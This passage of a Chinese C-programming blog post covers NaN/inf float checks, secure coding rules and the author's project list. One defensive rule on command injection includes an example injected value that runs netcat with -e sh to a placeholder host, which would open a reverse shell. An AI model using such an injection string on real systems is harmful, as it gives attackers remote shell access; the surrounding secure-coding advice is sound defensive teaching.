class="line">inf</span><br><span class="line">x is inf</span><br><span class="line">nan</span><br><span class="line">x is nan</span><br></pre></td></tr></table></figure></div>

<p>上面的代码中使用了scanf来得到用户输入的浮点数。令人惊讶的是，scanf不仅接受inf和nan的输入，并将其视为浮点数的两种特殊值。那么对于UI程序来说，当遇到浮点数值的时候，我们必须首先判断其是否为合法的浮点值。笔者就遇到过一个开源库返回的浮点数为NaN的情况。</p>
<p>令人高兴的是，C库提供了两个库函数<code>isinf</code>和<code>isnan</code>，分别用于判断浮点数是否为<code>infinite</code>和<code>NaN</code>。</p>
<h1 id="代码和行为规范问题"><a href="#代码和行为规范问题" class="headerlink" title="代码和行为规范问题"></a>代码和行为规范问题</h1><p>这里并不能罗列所有问题和规范，还需经验总结和习惯。我以安全的视角来提醒一些程序员注意自己的代码规范问题。还有一些内容在其他文章里面。</p>
<p><strong>0. 把右值放在条件判断的左边</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">do_leap</span><span class="params">(<span class="type">const</span> <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="number">0</span> == y %<span class="number">4</span>  &amp;&amp; <span class="number">0</span> != y % <span class="number">100</span>) || <span class="number">0</span> == y % <span class="number">400</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样做的好处是在大型的项目中，不小心把<code>==</code>写成<code>=</code>编译就会报错。否则编译不会出错但是会有警告，对于一些轻视警告的程序员来说这样的<code>bug</code>调试起来是十分费力的。</p>
<p><strong>1. 重视一切警告和单元测试</strong>。</p>
<p><strong>2. 把不希望被意外改变的变量传参时把形参定义为 const</strong></p>
<p><strong>3. 对字符串操作时使用带’n’的函数，即有长度限制的函数（避免溢内存出漏洞）</strong></p>
<p><strong>4. 不要直接将字符串指针放在格式化字符串函数中（避免格式化字符串漏洞）</strong></p>
<p><strong>5. 对于IO函数的选取，也要限制读取长度，并且不要超过栈&#x2F;堆上变量大小（避免内存溢出漏洞）</strong></p>
<p><strong>6. 不要使用<code>gets</code>, <code>strcpy</code>, <code>sprintf</code>, <code>memcpy</code>, <code>strcat</code>等危险函数（容易导致内存溢出漏洞）</strong></p>
<p><strong>7. 使用 <code>system</code> 和 <code>exec</code> 家族的函数 和 <code>popn</code> 等命令执行函数时，要过滤所有可能导致命令注入的字符串 “&amp;”  “$”  “|”  “&amp;&amp;”  “||”  “;”  “!”  “ `” 等潜在的命令注入字符。eg. system(“you_code; nc x.x.x.x xxxx -e sh;”)</strong></p>
<p><strong>8. 编译时加 -Wall 并且不要忽视任何警告信息</strong></p>
<p><strong>9. 不要忽略任何一次小的单元测试</strong></p>
<p><strong>10. 当不能使用简单点循环解决问题，再考虑递归函数，否则程序开销会很大</strong></p>
<p><strong>11. 循环数组时，数组的大小要用宏定义定义好，或者使用<code>sizeof</code>来计算数组的大小，这样修改数组的大小</strong></p>
<p><strong>12. 不要使用glibc的signal函数，它的历史负担太重，不同glibc版本和操作系统版本实现可能不同，语义模糊。Linux给出了语义更加精确的sigaction。</strong></p>
<p><strong>13. 比较两个结构体时，若结构体中含有大量的成员变量，为了方便，程序员往往会直接使用memcmp对这两个结构体进行比较，以避免对每个成员进行分别比较。这样的代码写起来比较简单，然而却很可能深藏隐患。除非在项目中可以保证所有的结构体都会使用memset来进行初始化（这个是很难保证的），否则就不要直接使用memcmp来比较结构体。</strong></p>
<p><strong>14. 小心浮点陷阱</strong></p>
<h1 id="C-语言项目"><a href="#C-语言项目" class="headerlink" title="C 语言项目"></a>C 语言项目</h1><p>学之前可以先看一下博客中《数据结构与算法》《Linux环境编程系列》这几篇篇文章。我写的注释比较全了，哪里看不懂直接去找相关文章即可。</p>
<h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><h2 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h2><h2 id="内存池"><a href="#内存池" class="headerlink" title="内存池"></a>内存池</h2><h2 id="协程库"><a href="#协程库" class="headerlink" title="协程库"></a>协程库</h2><p>项目地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/jelasin/LibCoroutine" >https://github.com/jelasin/LibCoroutine<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>开发笔记：博客搜索 <code>LibCoroutine开发手记</code></p>
<p>C 语言的细粒度协程库，支持signal,wait,yield等。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/libcoroutine-1743588401161-4.png"
                      alt="libcoroutine"
                ></p>
<h2 id="无锁编程库"><a href="#无锁编程库" class="headerlink" title="无锁编程库"></a>无锁编程库</h2><p>使用读写引用计数完成一个无锁编程库。某天坐出租车去上班时的一个想法，忘了记录，也忘记当初设想的架构了……</p>
<h2 id="LibCSTL"><a href="#LibCSTL" class="headerlink" title="LibCSTL"></a>LibCSTL</h2><p>从内核移植一些优秀的数据结构和算法，和一些其他常用的排序，哈希，加解密算法等。基于C实现。</p>
<p>项目链接：<a class="link"   target="_blank" rel="noopener" href="https://github.com/jelasin/LibCSTL" >https://github.com/jelasin/LibCSTL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="ChatAI-集成库"><a href="#ChatAI-集成库" class="headerlink" title="ChatAI 集成库"></a>ChatAI 集成库</h2><p>项目链接：<a class="link"   target="_blank" rel="noopener" href="https://github.com/jelasin/LibChat" >https://github.com/jelasin/LibChat<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>使用 C 语言实现的适合嵌入式设备的 llm 应用开发库，未完工状态……</p>
<h2 id="NetFS"><a href="#NetFS" class="headerlink" title="NetFS"></a>NetFS</h2><p>项目地址：</p>
<p>为了解决嵌入式存储空间不足问题，启用的网络存储文件系统，可以选择局域网内存储，和网络存储。</p>
<h2 id="高并发服务器"><a href="#高并发服务器" class="headerlink" title="高并发服务器"></a>高并发服务器</h2><h2 id="网络视频监控"><a href="#网络视频监控" class="headerlink" title="网络视频监控"></a>网络视频监控</h2><h2 id="TinyBox"><a href="#TinyBox" class="headerlink" title="TinyBox"></a>TinyBox</h2><p>项目链接：<a class="link"   target="_blank" rel="noopener" href="https://github.com/jelasin/tinybox" >https://github.com/jelasin/tinybox<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>这个项目是用来学习Linux系统编程的一个不错的选择，我有时间会把它构建的完整，支持Linux的绝大部分常用命令，可以选择性构建它，选择你需要的命令集合，未完工……</p>
<h2 id="x86-操作系统"><a href="#x86-操作系统" class="headerlink" title="x86 操作系统"></a>x86 操作系统</h2><h2 id="x64-操作系统"><a href="#x64-操作系统" class="headerlink" title="x64 操作系统"></a>x64 操作系统</h2><h2 id="TinyDocker"><a href="#TinyDocker" class="headerlink" title="TinyDocker"></a>TinyDocker</h2><h2 id="TinyNetbox"><a href="#TinyNetbox" class="headerlink" title="TinyNetbox"></a>TinyNetbox</h2>
		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> C语言编程</li>
        <li><strong>Author:</strong> 韩乔落</li>
        <li><strong>Created at
                :</strong> 2025-01-23 14:44:14</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-04-02 18:06:43
            </li>
        
        <li>
            <strong>Link:</strong> https://jelasin.github.io/2025/01/23/C语言编程/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/01/23/C++%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E4%B9%8BBoost%E6%A0%87%E5%87%86%E5%BA%93/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">C++语言编程之Boost标准库</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/01/21/Qt6%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Qt6开发指南</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'jelasin/jelasin.github.io',
                'data-repo-id': 'R_kgDOKVydDA',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDOKVydDM4CZe2W',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'not-lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">C语言编程</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-C-%E6%97%B6%E9%97%B4%E5%A4%84%E7%90%86"><span class="nav-text">Linux C 时间处理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E6%9E%97%E5%B0%BC%E6%B2%BB%E6%97%B6%E9%97%B4"><span class="nav-text">格林尼治时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-text">时间数据类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#time-t"><span class="nav-text">time_t</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#struct-timespec"><span class="nav-text">struct timespec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#struct-tm"><span class="nav-text">struct tm</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="nav-text">时间处理函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#time"><span class="nav-text">time()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctime"><span class="nav-text">ctime()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gmtime-localtime"><span class="nav-text">gmtime()&#x2F;localtime()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mktime"><span class="nav-text">mktime()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strftime"><span class="nav-text">strftime()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#difftime"><span class="nav-text">difftime()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#clock-gettime"><span class="nav-text">clock_gettime()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strptime"><span class="nav-text">strptime()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-text">示例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%BA%93%E4%B8%8E%E9%9D%99%E6%80%81%E5%BA%93"><span class="nav-text">动态库与静态库</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%BA%93%EF%BC%88Static-Library%EF%BC%89"><span class="nav-text">静态库（Static Library）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%BA%93%E7%9A%84%E7%89%B9%E7%82%B9"><span class="nav-text">静态库的特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C%E9%9D%99%E6%80%81%E5%BA%93%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="nav-text">制作静态库的步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%BA%93%EF%BC%88Dynamic-Library%EF%BC%89"><span class="nav-text">动态库（Dynamic Library）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%BA%93%E7%9A%84%E7%89%B9%E7%82%B9"><span class="nav-text">动态库的特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C%E5%8A%A8%E6%80%81%E5%BA%93%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="nav-text">制作动态库的步骤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GNU-C-%E6%89%A9%E5%B1%95%E8%AF%AD%E6%B3%95"><span class="nav-text">GNU C 扩展语法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E5%AE%9A%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-text">指定初始化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%AD%E5%8F%A5%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">语句表达式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8F%E5%AE%9A%E4%B9%89%E4%B8%AD%E7%9A%84%E8%AF%AD%E5%8F%A5%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">宏定义中的语句表达式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#typeof%E4%B8%8Econtainer-of%E5%AE%8F"><span class="nav-text">typeof与container_of宏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9B%B6%E9%95%BF%E6%95%B0%E7%BB%84"><span class="nav-text">零长数组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E5%A3%B0%E6%98%8E"><span class="nav-text">属性声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E8%81%94%E5%87%BD%E6%95%B0"><span class="nav-text">内联函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-text">内建函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E5%AE%8F"><span class="nav-text">可变参数宏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E5%87%BD%E6%95%B0%E5%90%8D"><span class="nav-text">当前函数名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96"><span class="nav-text">内联汇编</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%B0%E4%BB%A3-C-%E8%AF%AD%E8%A8%80"><span class="nav-text">现代 C 语言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#c99"><span class="nav-text">c99</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c11"><span class="nav-text">c11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C%E5%BA%93"><span class="nav-text">原子操作库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c17"><span class="nav-text">c17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c23"><span class="nav-text">c23</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8"><span class="nav-text">线程安全</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E5%AD%90%E7%BC%96%E7%A8%8B"><span class="nav-text">原子编程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E9%94%81%E7%BC%96%E7%A8%8B"><span class="nav-text">无锁编程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B"><span class="nav-text">异步编程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#io-uring"><span class="nav-text">io_uring</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-text">工作原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="nav-text">使用步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E5%92%8C%E6%B8%85%E7%90%86"><span class="nav-text">初始化和清理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E4%BA%A4%E8%AF%B7%E6%B1%82"><span class="nav-text">提交请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E8%AF%B7%E6%B1%82"><span class="nav-text">操作请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%88%90%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86"><span class="nav-text">完成请求处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E7%82%B9"><span class="nav-text">关键点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="nav-text">示例代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E7%82%B9-1"><span class="nav-text">关键点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AIO"><span class="nav-text">AIO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="nav-text">核心概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#aiocb-%E7%BB%93%E6%9E%84"><span class="nav-text">aiocb 结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%82%E6%AD%A5I-O%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="nav-text">异步I&#x2F;O操作函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8A%B6%E6%80%81%E6%9F%A5%E8%AF%A2%E5%87%BD%E6%95%B0"><span class="nav-text">状态查询函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-1"><span class="nav-text">示例代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#I-O-%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8"><span class="nav-text">I&#x2F;O 多路复用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#select"><span class="nav-text">select</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poll"><span class="nav-text">poll</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#epoll"><span class="nav-text">epoll</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B"><span class="nav-text">网络编程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#libcurl"><span class="nav-text">libcurl</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#API-easy"><span class="nav-text">API: easy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-text">1. 初始化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%9B%E5%BB%BA%E5%92%8C%E5%88%9D%E5%A7%8B%E5%8C%96-CURL-%E5%8F%A5%E6%9F%84"><span class="nav-text">2. 创建和初始化 CURL 句柄</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%AE%BE%E7%BD%AE%E8%AF%B7%E6%B1%82%E9%80%89%E9%A1%B9"><span class="nav-text">3. 设置请求选项</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%89%A7%E8%A1%8C%E8%AF%B7%E6%B1%82"><span class="nav-text">4. 执行请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%B8%85%E7%90%86%E8%B5%84%E6%BA%90"><span class="nav-text">5. 清理资源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E7%A4%BA%E4%BE%8B"><span class="nav-text">完整示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cJSON"><span class="nav-text">cJSON</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AE%89%E8%A3%85%E5%92%8C%E5%8C%85%E5%90%AB%E5%A4%B4%E6%96%87%E4%BB%B6"><span class="nav-text">1. 安装和包含头文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%A7%A3%E6%9E%90-JSON-%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">2. 解析 JSON 字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%AE%BF%E9%97%AE-JSON-%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%85%83%E7%B4%A0"><span class="nav-text">3. 访问 JSON 对象的元素</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%9E%84%E5%BB%BA-JSON-%E5%AF%B9%E8%B1%A1"><span class="nav-text">4. 构建 JSON 对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%B0%86-JSON-%E5%AF%B9%E8%B1%A1%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">5. 将 JSON 对象转换为字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E9%87%8A%E6%94%BE-JSON-%E5%AF%B9%E8%B1%A1"><span class="nav-text">6. 释放 JSON 对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E5%AE%8C%E6%95%B4%E7%A4%BA%E4%BE%8B"><span class="nav-text">7. 完整示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E6%9D%82-JSON-%E7%A4%BA%E4%BE%8B"><span class="nav-text">复杂 JSON 示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E5%A4%8D%E6%9D%82-JSON"><span class="nav-text">解析复杂 JSON</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="nav-text">解析技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%93%E5%87%BAJSON%E6%95%B0%E6%8D%AE"><span class="nav-text">输出JSON数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Someth-Interesting"><span class="nav-text">Someth Interesting</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E8%A6%81%E4%BD%BF%E7%94%A8memcmp%E6%AF%94%E8%BE%83%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">不要使用memcmp比较结构体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88"><span class="nav-text">数组和指针</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%8D%E8%AE%BA%E6%95%B0%E7%BB%84%E9%A6%96%E5%9C%B0%E5%9D%80"><span class="nav-text">再论数组首地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E6%98%AF%E4%BD%A0%E6%83%B3%E7%9A%84%E9%82%A3%E4%B8%AA%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="nav-text">不是你想的那个整数类型转换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E5%BF%83volatile%E7%9A%84%E5%8E%9F%E5%AD%90%E6%80%A7%E8%AF%AF%E8%A7%A3"><span class="nav-text">小心volatile的原子性误解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9Cx-x%E2%80%9D-%E4%BD%95%E6%97%B6%E4%B8%BA%E5%81%87%EF%BC%9F"><span class="nav-text">“x&#x3D;&#x3D;x” 何时为假？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E5%BF%83%E6%B5%AE%E7%82%B9%E9%99%B7%E9%98%B1"><span class="nav-text">小心浮点陷阱</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%AE%E7%82%B9%E6%95%B0%E7%9A%84%E7%B2%BE%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-text">浮点数的精度限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E7%9A%84%E6%B5%AE%E7%82%B9%E5%80%BC"><span class="nav-text">两个特殊的浮点值</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%92%8C%E8%A1%8C%E4%B8%BA%E8%A7%84%E8%8C%83%E9%97%AE%E9%A2%98"><span class="nav-text">代码和行为规范问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#C-%E8%AF%AD%E8%A8%80%E9%A1%B9%E7%9B%AE"><span class="nav-text">C 语言项目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E6%B1%A0"><span class="nav-text">线程池</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%B1%A0"><span class="nav-text">进程池</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%B1%A0"><span class="nav-text">内存池</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%8F%E7%A8%8B%E5%BA%93"><span class="nav-text">协程库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E9%94%81%E7%BC%96%E7%A8%8B%E5%BA%93"><span class="nav-text">无锁编程库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LibCSTL"><span class="nav-text">LibCSTL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ChatAI-%E9%9B%86%E6%88%90%E5%BA%93"><span class="nav-text">ChatAI 集成库</span></a></li><li class="nav-item nav-level-2"><a 